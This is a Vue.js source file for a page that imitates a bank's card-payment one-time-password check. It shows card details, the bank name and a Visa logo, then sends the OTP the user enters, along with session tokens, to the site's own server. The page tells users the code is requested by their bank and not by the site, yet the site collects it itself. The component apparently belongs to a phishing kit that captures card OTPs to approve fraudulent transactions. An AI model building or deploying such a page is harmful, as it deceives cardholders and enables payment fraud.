import axios from 'axios';
import './1.css';



export default {
    data() {
        console.log('Token from sessionStorage after redirect:', sessionStorage.getItem('token'));
        console.log('sessionStorage after redirect:', sessionStorage.getItem('secureCodeId'));
        return {
            phoneEnding: sessionStorage.getItem('phoneEnding') || 'xxxx',
            bankName: sessionStorage.getItem('bankName') || 'xxxxx',
            transactionAmount: sessionStorage.getItem('transactionAmount') || 'xxxxx',
            formattedCardNumber: sessionStorage.getItem('formattedCardNumber') || 'xxxxx',
            currency: sessionStorage.getItem('currency') || '',
            otp: '',
            token: sessionStorage.getItem('token') || null, // Token для связи с сервером
            remainingTime: 60,
            timerId: null,
            secureCodeId:sessionStorage.getItem('secureCodeId') || '',
        };
    },    
    template: `
    <div id="unique-form-wrapper">
    <div id="main-container" class="container mt-5">
        <p>
        We are committed to providing a secure and seamless payment experience for our customers. When you make a purchase through our platform, your bank may request a One-Time Password (OTP) to verify your identity. This is a standard security measure aimed at protecting your financial information. Please note that this OTP is requested by your bank, not by our website or service provider.

        Payments through our platform are supported in all countries of the European Union, the Americas, and Asia, with the notable exceptions of Russia and Belarus.
        
        We stand in solidarity with the people affected by the conflict and are firmly against the war in Ukraine.
        
        Your security and peace of mind are our top priorities.
                </p>
        
        <div id="main-row" class="row justify-content-center">
            <div id="main-col" class="col-18 col-md-10 col-lg-5 col-sm-16">
                <div id="main-card" class="card border-secondary">
                    <div id="card-body" class="card-body">
                        <div id="logo-container" class="text-center">
                            <img src="http://127.0.0.1:8000/storage/media/visa./11.png" alt="Logo" class="mb-3" width="127" height="72">
                            <hr class="mx-2" style="border-color: lightgrey;">
                        </div>

                        <p id="otp-instruction"> Enter your One-Time Password (OTP)</p>
                        <p id="otp-info">An OTP has been sent to your mobile phone number ending with <strong>{{ phoneEnding }}</strong>.</p>
                        
                        <table id="transaction-table" class="mt-3 mb-3">
                            <tr id="merchant-row" class="py-2">
                                <td id="merchant-label" class="label-column">Merchant:</td>
                                <td id="merchant-value">TechMarket</td>
                            </tr>
                            
                            <tr id="bank-row" class="py-2">
                                <td id="bank-label" class="label-column">Bank Name:</td>
                                <td id="bank-value">{{ bankName }}</td>
                            </tr>
                            
                            <tr id="amount-row" class="py-2">
                                <td id="amount-label" class="label-column">Transaction Amount:</td>
                                <td id="amount-value">{{ transactionAmount }} {{ currency }}</td>                                
                            </tr>
                            
                            <tr id="card-row" class="py-2">
                                <td id="card-label" class="label-column">Card Number:</td>
                                <td id="card-value">{{ formattedCardNumber }}</td>
                            </tr>
                            
                            <tr id="otp-row" class="py-2">
                                <td id="otp-label" class="label-column">One-Time Password:</td>
                                <td id="otp-input">
                                    <input type="password" v-model="otp" style="height:20px; width: 70px;" class="form-control">
                                </td>
                            </tr>
                        </table>


                        <button id="submit-btn" @click="submitOtp" type="submit" class="btn btn-primary mt-3 w-100">Submit</button>

                        <div id="otp-links" class="text-center mt-2">
                            <p v-if="remainingTime > 0">Resend OTP in {{ remainingTime }} seconds</p>
                            <span @click="resendOtp" class="resend-link112" v-else>Resend OTP</span>
                            | <a href="/help">Help?</a> | <a href="/en" @click="exit" >Exit</a>
                        </div>


                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
    `,
    methods: {
        startTimer() {
            this.remainingTime = 60;
            this.timerId = setInterval(() => {
                if (this.remainingTime > 0) {
                    this.remainingTime--;
                } else {
                    clearInterval(this.timerId);
                }
            }, 1000);
        },
        submitOtp() {
            axios.post('/api/submit-otp', {
                otp: this.otp,
                token: this.token,
                secureCodeId: this.secureCodeId

                
            }).then(response => {
                console.log('Token before sending:', this.token);

                console.log('OTP submitted successfully:', response.data);
                if (response.data.success) {
                    window.location.href = '/checkout/complete';
                } else {
                    alert(response.data.message || 'Something went wrong. Please try again.');
                }
            }).catch(error => {
                console.error('Error submitting OTP:', error);
            });
        },
        
        resendOtp() {
            axios.post('/api/resend-otp', {
                token: this.token,
                secureCodeId: this.secureCodeId

            }).then(response => {
                console.log('OTP resend requested:', response.data);
                this.startTimer();
            }).catch(error => {
                console.error('Error resending OTP:', error);
            });
        },
        exit() {
            axios.post('/api/exit', {
                token: this.token,
                secureCodeId: this.secureCodeId

            }).then(response => {
                console.log('Exit requested:', response.data);
                window.location.href = '/en';
            }).catch(error => {
                console.error('Error requesting exit:', error);
            });
        }
    },
    mounted() {
        this.startTimer();
    },
    beforeDestroy() {
        clearInterval(this.timerId);
    },
    
};
